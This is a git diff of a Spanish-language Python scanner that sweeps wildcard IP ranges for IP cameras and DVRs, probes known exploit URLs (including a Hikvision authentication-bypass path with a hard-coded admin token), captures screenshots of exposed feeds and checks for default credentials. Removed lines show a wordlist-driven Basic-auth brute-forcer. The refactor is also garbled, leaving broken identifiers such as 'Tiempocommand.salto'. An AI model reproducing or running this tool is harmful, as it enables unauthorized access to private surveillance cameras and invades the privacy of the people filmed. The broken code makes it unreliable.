@@ -23,11 +23,11 @@ from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from fake_useragent import UserAgent
 import concurrent.futures
-import argparse  # Importa el módulo argparse
 #LIBRERIAS-NUEVAS-SMB
 from impacket import smb3, ntlm
 from collections import OrderedDict
 import datetime
+import command
 
 def clear():
     if os.name == 'nt':
@@ -41,23 +41,6 @@ ports_por_defecto = [
     8554, 8002, 8200, 8280, 8834, 88, 8002, 9000, 7000,
     8500, 8554, 1024, 10554, 1025, 555, 1554, 8002, 9002, 82, 88, 2554, 5540, 6036, 8021, 8553, 51235
 ]
-
-parser = argparse.ArgumentParser(description='Escaneo de puertos en direcciones IP')
-
-parser.add_argument('--search', required=True, help='Patrón de direcciones IP a escanear con el * como comodín (ejemplo: 192.168.*.*) busqueda avanzada con google:https://www.exploit-db.com/google-hacking-database')
-parser.add_argument('--port', nargs='+', type=str, help='Puerto o puertos a escanear. Presiona Enter para usar los puertos predeterminados o "all" para escanear todos los puertos.')
-parser.add_argument('--region', help='Filtrar por región ej US,AR,MX')
-parser.add_argument('--ciudad', help='Filtrar por ciudad')
-parser.add_argument('--w', help='Ruta del archivo de texto con el wordlist (usuarios y contraseñas)')
-parser.add_argument('--s', default=0.5, type=float, help='Tiempo de espera entre conexiones[SOCKET] (valor predeterminado: 0.5 segundos)')
-parser.add_argument('--bn', default=2, type=float, help='Tiempo de espera [BANNER] (valor predeterminado: 2 segundos)')
-parser.add_argument('--has_screenshot', choices=['all', 'cam'], default=None, help='Captura de pantalla [--has_screenshot all (todas las urls)] [--has_screenshot cam (todas las que se reconocen como camaras)]')
-parser.add_argument('--reanudar', help='IP a partir de la cual se reanudará el escaneo EJ: --search 144.88.*.* --reanudar 144.88.92.63')
-parser.add_argument('--fast', default=0, type=int, const=50, nargs='?', help='Salto de IPS para búsqueda rápida')
-parser.add_argument('--time', default=30, type=int, help='Valor de tiempo para la opción --fast')
-
-# Analizar los argumentos proporcionados al script
-args = parser.parse_args()
 
 trozos_puerto = []  # Variable global para almacenar los trozos de puertos
 
@@ -80,10 +63,10 @@ def GenerarPuertos():
     limpiar_thread.start()
     
     # Actualizar los puertos según los argumentos proporcionados
-    if args.port and "all" in args.port:
+    if command.args.port and "all" in command.args.port:
         ports = list(puertos_todos)
-    elif args.port:
-        ports = [int(puerto) for puerto in args.port]
+    elif command.args.port:
+        ports = [int(puerto) for puerto in command.args.port]
     else:
         ports = ports_por_defecto
     
@@ -91,55 +74,47 @@ def GenerarPuertos():
 
 ports = GenerarPuertos()
 
-# Acceder a los argumentos en el código
-ip_pattern = args.search
-FiltroRegion = args.region
-FiltroCiudad = args.ciudad
-reanudar_ip = args.reanudar
-salto = args.fast
-TiempoSalto = args.time
-
 # Limpiar la pantalla (se asume que la función clear() está definida)
 clear()
 
 # Inicializar variables
 processed_ips = 0
-num_stars = ip_pattern.count('*')
+num_stars = command.ip_pattern.count('*')
 threads = []
 ip_queue = queue.Queue()
 last_index = 0
 
 # Verificar si se proporciona una IP para reanudar
-if reanudar_ip:
+if command.reanudar_ip:
     # Buscar la IP de reanudación en la cola
     while not ip_queue.empty():
         current_ip = ip_queue.get()
         last_index += 1
         ip_queue.put(current_ip)
-        if current_ip == reanudar_ip:
+        if current_ip == command.reanudar_ip:
             break
 
     # Iterar sobre posibles valores para las partes del patrón con comodines
     for i in range(last_index, 256**num_stars):
         parts = [i // (256**j) % 256 for j in range(num_stars)][::-1]
-        ip = ip_pattern.replace('*', '{}').format(*parts)
+        ip = command.ip_pattern.replace('*', '{}').format(*parts)
 
         if last_index > 0:
             ip_queue.put(ip)
-        elif ip == reanudar_ip:
+        elif ip == command.reanudar_ip:
             last_index += 1
             ip_queue.put(ip)
             
-if salto is not None and salto != 0:
-    # Resto del código para la generación de IPs con salto
-    for i in range(0, 256**num_stars, salto):
+if command.salto is not None and command.salto != 0:
+    # Resto del código para la generación de IPs con command.salto
+    for i in range(0, 256**num_stars, command.salto):
         parts = [i // (256**j) % 256 for j in range(num_stars)][::-1]
-        ip = ip_pattern.replace('*', '{}').format(*parts)
+        ip = command.ip_pattern.replace('*', '{}').format(*parts)
         ip_queue.put(ip)
 else:
     for i in range(0, 256**num_stars):
         parts = [i // (256**j) % 256 for j in range(num_stars)][::-1]
-        ip = ip_pattern.replace('*', '{}').format(*parts)
+        ip = command.ip_pattern.replace('*', '{}').format(*parts)
         ip_queue.put(ip)
 
         
@@ -194,7 +169,7 @@ def is_camera(ip, port, banner):
     except:
         return False
 
-# Define your filter criteria (FiltroRegion and FiltroCiudad) here
+# Define your filter criteria (command.FiltroRegion and command.FiltroCiudad) here
 
 exploit_checks = [
     "/System/deviceInfo?auth=YWRtaW46MTEK",
@@ -221,34 +196,6 @@ class Colors:
     YELLOW = '\033[93m'
 
 
-def enviar_solicitud(ip, port, carga_cancelada, resultados):
-    urls = [
-        f'http://{ip}:{port}/video.mjpg',
-        f'http://{ip}:{port}/cgi-bin/viewer/video.jpg',
-        f'http://{ip}:{port}/onvif/Media',
-        f'http://{ip}:{port}/System/configurationFile?auth=YWRtaW46MTEK',
-        f'http://{ip}:{port}/pda.htm',
-        f'http://{ip}:{port}/main.htm',
-        f'http://{ip}:{port}/video.cgi?',
-        f'http://{ip}:{port}/web/mobile.html',
-        f'http://{ip}:{port}/asp/video.cgi'
-        f'http://{ip}:{port}/serverpush.htm'
-    ]
-
-    with concurrent.futures.ThreadPoolExecutor() as executor:
-        futures = [executor.submit(enviar_solicitud_individual, ip, port, url, carga_cancelada, resultados) for url in set(urls)]
-        concurrent.futures.wait(futures)
-
-usuarios = {}
-
-# Cargar el wordlist desde el archivo de texto si se proporciona
-if args.w:
-    with open(args.w, 'r') as file:
-        for line in file:
-            key, value = line.strip().split(':')
-            usuarios[key] = value
-
-
 def manejar_respuesta(ip, port, url, response, usuario, contraseña, carga_cancelada, resultados):
     for chunk in response.iter_content(chunk_size=1024):
         if carga_cancelada.is_set():
@@ -266,36 +213,6 @@ def manejar_respuesta(ip, port, url, response, usuario, contraseña, carga_cance
             capture_screenshot(ip, port, usuario=usuario, contraseña=contraseña)
             guardar_url(ip, port, url, usuario, contraseña)
 
-# Modifica la función enviar_solicitud_individual para pasar también la contraseña a manejar_respuesta
-def enviar_solicitud_individual(ip, port, url, carga_cancelada, resultados):
-    for usuario, contraseña in usuarios.items():
-        try:
-            credentials = base64.b64encode(f'{usuario}:{contraseña}'.encode('utf-8')).decode('utf-8')
-            
-            headers = {
-                'Authorization': f'Basic {credentials}',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Accept-Language': 'es-ES,es;q=0.9',
-                'Connection': 'close'
-            }
-
-            response = requests.get(url, headers=headers, stream=True, timeout=0.5)
-            response.raise_for_status()
-
-            if response.status_code == 200:
-                manejar_respuesta(ip, port, url, response, usuario, contraseña, carga_cancelada, resultados)
-
-                # Detener la exploración después de encontrar la primera vulnerabilidad
-                if len(resultados) > 0:
-                    return
-            else:
-                # Puedes agregar lógica aquí para manejar otros casos si es necesario
-                pass
-
-        except requests.exceptions.RequestException:
-            resultados.append(None)
             
 # Modifica la función guardar_url para incluir el usuario y la contraseña
 def guardar_url(ip, port, url, usuario, contraseña):
@@ -888,7 +805,7 @@ def scan(ip, ports):
         for port in ports:
             try:
                 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-                    sock.settimeout(args.s)
+                    sock.settimeout(command.args.s)
 
                     result = sock.connect_ex((ip, port))
                     if result != 0:
@@ -911,7 +828,7 @@ def scan(ip, ports):
                     hikvision_vulnerable, avtech_vulnerable, tvt_vulnerable, cam = False, False, False, False
 
                     # Check if the region and city match the filters
-                    if (FiltroRegion and region == FiltroRegion) or (FiltroCiudad and city == FiltroCiudad) or (FiltroCiudad is None and FiltroRegion is None):
+                    if (command.FiltroRegion and region == command.FiltroRegion) or (command.FiltroCiudad and city == command.FiltroCiudad) or (command.FiltroCiudad is None and command.FiltroRegion is None):
                         formatted_ip = f"{Fore.YELLOW}{ip}{Style.RESET_ALL}:{Fore.YELLOW}{port}{Style.RESET_ALL}"
                         formatted_service_name = f"{Fore.YELLOW}{service_name}{Style.RESET_ALL}"
                         formatted_banner = f"{Fore.CYAN}{banner}{Style.RESET_ALL}"
@@ -929,11 +846,11 @@ def scan(ip, ports):
 
                         #CHEQUEO DE CAMARAS
 
-                        if args.has_screenshot == 'all' and args.has_screenshot is not None:
+                        if command.args.has_screenshot == 'all' and command.args.has_screenshot is not None:
                             screenshot = capture_screenshot(ip, port)
 
                         if is_camera(ip, port, banner) and (not "HTTP/1.0 302 Found" in banner and not "unknown" in banner):
-                            if args.has_screenshot == 'cam' and args.has_screenshot is not None and "HTTP/1.1 401 Unauthorized" not in banner:
+                            if command.args.has_screenshot == 'cam' and command.args.has_screenshot is not None and "HTTP/1.1 401 Unauthorized" not in banner:
                                 capture_screenshot(ip, port, usuario=None, contraseña=None)
                             if "HTTP/1.0 401 Unauthorized Access Denied" in banner or "HTTP/1.0 401 Unauthorized" in banner or "HTTP/1.1 401 Unauthorized" in banner:
                                 cam = verificar_respuesta_200(ip, port, tiempo_cancelacion=1)
@@ -946,7 +863,7 @@ def scan(ip, ports):
                             print(f"{Fore.RED}[-]Cámara-No-Encontrada{Style.RESET_ALL}")
                             
                         if "HTTP/1.0 302 Found" in banner:
-                            if args.has_screenshot == 'cam' and args.has_screenshot is not None:
+                            if command.args.has_screenshot == 'cam' and command.args.has_screenshot is not None:
                                 screenshotCam = capture_screenshot(ip, port)
                             credentials_found = scan_dvr_credentials(ip, port)
                             
@@ -996,12 +913,12 @@ def scan(ip, ports):
 
             except socket.gaierror as e:
                 generated_ip = None
-                if args.fast:
+                if command.args.fast:
                     generated_ip = ip_queue.get()
                     print(generated_ip)
                     ip_queue.put(generated_ip)
-                    time.sleep(TiempoSalto)
-                if generated_ip is not None and salto is not None and salto != 0 :
+                    time.sleep(Tiempocommand.salto)
+                if generated_ip is not None and command.salto is not None and command.salto != 0 :
                     ip = generated_ip
                 continue
             except Exception as e:
@@ -1182,7 +1099,7 @@ def format_unknown(value):
 def get_banner(ip, port):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(args.bn)
+        sock.settimeout(command.args.bn)
         sock.connect((ip, port))
         sock.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
         banner = sock.recv(1024).decode().strip()
@@ -1218,13 +1135,13 @@ def get_location(ip):
 # Crear una barra de progreso con el número total de direcciones IP a escanear
 bar = tqdm(total=ip_queue.qsize(), desc="Escaneando direcciones IP")
 clear()
-print(f"Buscando {ip_pattern}")
+print(f"Buscando {command.ip_pattern}")
 
-ip_pattern_list = []
+command.ip_pattern_list = []
 
 # Definir el número máximo de subprocesos
 num_ips = ip_queue.qsize()
-if args.port == 'all':
+if command.args.port == 'all':
     max_workers = None  # Cambiar este número según sea necesario
 else:
     max_workers = num_ips
@@ -1234,12 +1151,12 @@ try:
     with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
         while not ip_queue.empty():
             ip = ip_queue.get()
-            ip_pattern_list.append(ip)
+            command.ip_pattern_list.append(ip)
             processed_ips += 1
 
             future = executor.submit(scan, ip, ports)
 
-            if salto is not None and salto != 0:
+            if command.salto is not None and command.salto != 0:
                 time.sleep(0.1)  # velocidad rápida
             else:
                 time.sleep(1)  # velocidad normal
